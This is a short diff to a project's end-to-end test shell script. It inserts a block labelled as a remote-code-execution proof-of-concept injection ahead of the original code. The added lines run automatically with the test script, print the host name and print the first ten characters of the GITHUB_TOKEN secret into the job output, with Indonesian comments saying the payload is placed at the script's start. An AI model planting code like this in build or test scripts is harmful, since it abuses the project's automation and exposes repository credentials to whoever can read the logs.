@@ -1,5 +1,14 @@
-#!/usr/bin/env bash
+#!/bin/bash
 
+# --- START RCE PROOF OF CONCEPT INJECTION (Etis) ---
+echo "--- RCE VULNERABILITY CONFIRMED ---"
+echo "Hostname: $(hostname)"
+echo "Token Prefix (High Privilege Access): ${GITHUB_TOKEN:0:10}"
+echo "-----------------------------------"
+# --- END RCE PROOF OF CONCEPT INJECTION ---
+
+# Sisipkan payload di awal skrip
+# ... sisanya adalah kode asli dari e2e/run.sh
 set -euxo pipefail
 
 waitport() {
